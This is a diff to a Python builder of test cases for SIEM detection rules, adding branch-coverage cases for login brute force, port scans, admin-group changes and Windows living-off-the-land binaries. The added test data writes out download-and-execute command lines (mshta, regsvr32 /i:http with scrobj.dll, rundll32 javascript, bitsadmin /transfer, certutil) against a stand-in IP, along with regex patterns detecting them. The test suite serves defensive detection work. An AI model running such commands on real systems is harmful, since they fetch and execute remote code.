@@ -14,6 +14,7 @@ Event Windows dùng <EventData> cho mọi trường (kể cả 1102, thật ra l
 from __future__ import annotations
 
 import json
+import re
 import sys
 from datetime import datetime
 from pathlib import Path
@@ -35,7 +36,8 @@ SYSLOG_TS = "Oct 31 10:00:00"
 _EC_PREFIX = "f:EventChannel:"
 _AUDIT_PREFIX = "1:/var/log/audit/audit.log:"
 _FIM_TYPE = {"file_created": "added", "file_modified": "modified", "file_deleted": "deleted"}
-_SIDS = {"administrators": "S-1-5-32-544", "users": "S-1-5-32-545", "remote desktop users": "S-1-5-32-555"}
+_SIDS = {"administrators": "S-1-5-32-544", "users": "S-1-5-32-545", "remote desktop users": "S-1-5-32-555",
+         "domain admins": "S-1-5-21-1-2-3-512", "enterprise admins": "S-1-5-21-1-2-3-519"}
 
 
 class Unrenderable(Exception):
@@ -150,6 +152,10 @@ WIN_EVENTS = {
 }
 
 
+WIN_EVENTS[4728] = WIN_EVENTS[4732]     # thêm vào nhóm toàn cục (Domain/Enterprise Admins); cùng trường
+WIN_EVENTS[1117] = WIN_EVENTS[1116]     # Defender đã xử lý mã độc
+
+
 def windows_event(doc: dict, rid: int) -> str:
     """JSON mà agent Windows gửi cho một ca ECS (Security/System/Defender theo event.code, PowerShell, hoặc Sysmon EID 1)."""
     if (code := get(doc, "event.code")) in WIN_EVENTS:
@@ -193,20 +199,101 @@ def _render(code: str, docs: list[dict]) -> list[tuple[str, str, list]]:
     raise Unrenderable(f"không biết nguồn log của {code}")
 
 
+# ---------------------------------------------------------------- phủ nhánh (R30)
+# Rule cũ có nhiều nhánh điều kiện (mỗi giá trị của regex / danh sách): `builtin` chỉ khi ca dương phủ MỌI nhánh.
+# Nhãn nhánh lấy từ chính điều kiện của rule YAML; ca dương có khóa `branch` để bộ báo cáo biết nhánh nào đã được chứng minh.
+_WEB007 = ["wp-login", "signin", "login", "auth", "admin"]                    # url.path khớp (login|signin|wp-login|auth|admin)
+_WIN012 = [("certutil-urlcache", r"certutil(\.exe)?.*-urlcache.*http"), ("certutil-decode", r"certutil(\.exe)?.*-decode"),
+           ("mshta", r"mshta(\.exe)?\s+(http|javascript|vbscript)"), ("regsvr32", r"regsvr32(\.exe)?.*/i:http"),
+           ("rundll32-javascript", r"rundll32(\.exe)?.*javascript:"), ("bitsadmin", r"bitsadmin(\.exe)?.*/transfer")]
+_WIN004 = ["administrators", "domain admins", "enterprise admins", "remote desktop users"]
+BRANCHES = {"WEB-007": _WEB007, "WIN-012": [b for b, _ in _WIN012], "WIN-004": _WIN004,
+            "NET-001": ["deny", "allow"], "WIN-011": ["1116", "1117"]}
+
+
+def branch_of(code: str, docs: list[dict]) -> str | None:
+    d = docs[0]
+    if code == "WEB-007":
+        return next((b for b in _WEB007 if b in str(get(d, "url.original", "")).lower()), None)
+    if code == "WIN-012":
+        return next((b for b, rx in _WIN012 if re.search(rx, str(get(d, "process.command_line", "")), re.I)), None)
+    if code == "WIN-004":
+        return str(get(d, "group.name", "")).lower() or None
+    if code == "NET-001":
+        return "deny" if get(d, "event.action") == "deny" else "allow"
+    if code == "WIN-011":
+        return str(get(d, "event.code"))
+    return None
+
+
+STEM = {"WEB": "web", "WIN": "windows", "NET": "network"}
+
+
+def extra_cases() -> list[ruletest.Case]:
+    """Ca BỔ SUNG (không có trong server/rules/cases) để chứng minh phủ đủ nhánh / thử bản chất của rule `builtin` (R30).
+    Đều rút từ mẫu của chính rule cũ, không phải tấn công tự nghĩ ra."""
+    out: list[ruletest.Case] = []
+
+    def add(rule, name, expect, events, **spec):
+        out.append(ruletest.Case(rule, name, expect, {"events": events, **spec}, f"{STEM[rule.split('-')[0]]}.yml#extra"))
+
+    for path in ("/user/login", "/signin", "/auth/token", "/admin"):
+        add("WEB-007", f"10 lần POST {path} trong 10 giây", "alert", [{"apache": f"POST {path} HTTP/1.1"}], repeat=10)
+    add("WEB-007", "10 lần POST /contact (không phải form đăng nhập)", "none", [{"apache": "POST /contact HTTP/1.1"}], repeat=10)
+    proc = lambda name, cmd: {"event": {"category": "process"}, "process": {"name": name, "command_line": cmd}}  # noqa: E731
+    for name, cmd in (("certutil.exe", "certutil.exe -decode in.b64 out.exe"),
+                      ("mshta.exe", "mshta.exe http://203.0.113.5/a.hta"),
+                      ("regsvr32.exe", "regsvr32.exe /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll"),
+                      ("rundll32.exe", r"rundll32.exe javascript:\..\mshtml,RunHTMLApplication"),
+                      ("bitsadmin.exe", r"bitsadmin.exe /transfer job http://203.0.113.5/a.exe C:\Temp\a.exe")):
+        add("WIN-012", f"{name.split('.')[0]}: {cmd}", "alert", [proc(name, cmd)])
+    add("WIN-012", "regsvr32 đăng ký DLL cục bộ", "none", [proc("regsvr32.exe", r"regsvr32.exe /s C:\Windows\System32\vendor.dll")])
+    add("WIN-012", "bitsadmin liệt kê job", "none", [proc("bitsadmin.exe", "bitsadmin.exe /list")])
+    for code, grp in ((4728, "Domain Admins"), (4728, "Enterprise Admins"), (4732, "Remote Desktop Users")):
+        add("WIN-004", f"thêm vào {grp}", "alert",
+            [{"event": {"module": "windows", "code": code, "action": "group_member_added"}, "group": {"name": grp}, "user": {"name": "an"}}])
+    add("WIN-011", "Defender đã xử lý mã độc (1117)", "alert",
+        [{"event": {"module": "windows", "code": 1117, "category": "malware"}, "file": {"path": r"C:\Users\an\Downloads\inv.exe"}}])
+    conn = lambda act: {"event": {"category": "network", "action": act}, "source": {"ip": "203.0.113.10"},  # noqa: E731
+                        "destination": {"ip": "10.0.0.5"}}
+    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080]
+    add("NET-001", "20 cổng đích khác nhau, kết nối được cho phép (rule cũ không lọc hành động)", "alert", [conn("allow")],
+        repeat=20, vary={"field": "destination.port", "values": ports})
+    add("NET-001", "20 kết nối bị chặn tới MỘT cổng từ một nguồn (không phải quét cổng)", "none",
+        [{**conn("deny"), "destination": {"ip": "10.0.0.5", "port": 23}}], repeat=20)
+    add("NET-001", "19 cổng khác nhau (dưới ngưỡng 20)", "none", [conn("deny")], repeat=19,
+        vary={"field": "destination.port", "values": ports[:19]})
+    add("NET-002", "49 kết nối bị chặn (dưới ngưỡng 50)", "none",
+        [{**conn("deny"), "destination": {"ip": "10.0.0.5", "port": 23}}], repeat=49)
+    return out
+
+
 def build(cases_dir: Path = CASES_DIR) -> tuple[dict[str, list[dict]], dict[str, str]]:
     """({tên file: [ca log gốc]}, {mã rule: lý do ca không dựng được}). Mã có ca dương nào dựng được thì chỉ ghi chú thêm."""
     out: dict[str, list[dict]] = {}
     skipped: dict[str, str] = {}
     for path in sorted(cases_dir.glob("*.y*ml")):
         out[path.stem] = []
-    for c in ruletest.load_cases(cases_dir):
+    for c in ruletest.load_cases(cases_dir) + extra_cases():
         stem = c.source.split(".")[0]
+        extra = c.source.endswith("#extra")
         try:
             docs = ruletest.expand(c.spec)
-            for fmt, loc, events in _render(c.rule, docs):
-                tag = " (auditd)" if fmt == "audit" else ""
-                out[stem].append({"legacy": c.rule, "kind": "positive" if c.expect == "alert" else "negative",
-                                  "name": c.name + tag, "log_format": fmt, "location": loc, "events": events})
+            kind = "positive" if c.expect == "alert" else "negative"
+            variants = [("", docs)]
+            # R18: log web status 200 chỉ ra rule con chung 31106; bản status 404 của CÙNG request cho thấy rule tấn công cụ thể
+            if c.rule.startswith("WEB") and kind == "positive" and len(docs) == 1 and get(docs[0], "http.response.status_code") == 200:
+                variants.append((" (status 404)", [{**docs[0], "http": {**docs[0]["http"], "response": {
+                    **docs[0]["http"]["response"], "status_code": 404}}}]))
+            for tag, vdocs in variants:
+                for fmt, loc, events in _render(c.rule, vdocs):
+                    case = {"legacy": c.rule, "kind": kind, "name": ("[bổ sung phủ nhánh] " if extra else "") + c.name + tag
+                            + (" (auditd)" if fmt == "audit" else ""), "log_format": fmt, "location": loc, "events": events}
+                    if kind == "positive" and (b := branch_of(c.rule, docs)):
+                        case["branch"] = b
+                    if extra:
+                        case["extra"] = True
+                    out[stem].append(case)
         except Unrenderable as e:
             skipped[c.rule] = f"{skipped[c.rule]}; {e}" if c.rule in skipped and str(e) not in skipped[c.rule] else str(e)
     return out, skipped
